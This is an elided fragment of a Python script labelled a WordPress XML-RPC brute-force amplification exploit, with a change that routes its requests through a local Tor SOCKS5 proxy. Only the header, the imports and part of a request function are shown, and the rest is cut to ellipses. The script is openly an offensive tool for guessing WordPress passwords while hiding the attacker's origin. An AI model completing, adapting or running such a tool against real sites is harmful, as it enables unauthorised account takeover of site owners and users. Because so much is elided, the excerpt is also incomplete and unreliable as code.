#!/usr/bin/python
# Wordpress XML-RPC Brute Force Amplification Exploit by 1N3 - Fix to add proxy by Macaxeira
...
import time, urllib, urllib2, sys, requests, ssl, os
from array import *
...
def send_request(url, data):
    ...
    proxy = urllib2.ProxyHandler({'http': 'socks5://localhost:9050'})
